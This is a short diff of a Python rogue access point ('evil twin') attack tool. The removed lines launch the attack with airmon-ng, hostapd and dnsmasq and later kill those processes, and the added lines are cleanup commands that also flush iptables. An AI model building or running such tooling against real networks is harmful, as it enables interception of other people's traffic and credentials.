@@ -113,22 +113,13 @@ server=8.8.8.8
         self.log("Shutting down engine...", "STOP")
         if self.ap_process: self.ap_process.terminate()
         if self.dns_process: self.dns_process.terminate()
-        return True
-
-    def _attack_loop(self):
-        self.run_command(f"airmon-ng start {self.interface}")
-        self.run_command(f"hostapd /tmp/hostapd.conf &")
-        self.run_command(f"dnsmasq -C /tmp/dnsmasq.conf &")
-        self.start_evil_twin()
-
-    def stop_attack(self):
-        self.is_running = False
-        self.log("Shutting down all processes...", "STOP")
-        self.run_command("pkill hostapd")
-        self.run_command("pkill dnsmasq")
-        self.run_command("airmon-ng stop wlan0mon")
-        self.run_command("iptables --flush")
-        self.run_command("pkill php")
+        
+        # Cleanup any remaining rogue processes
+        if sys.platform != "win32":
+            subprocess.run(["pkill", "hostapd"])
+            subprocess.run(["pkill", "dnsmasq"])
+            subprocess.run(["iptables", "--flush"])
+            
         return True
 
     def start_evil_twin(self):
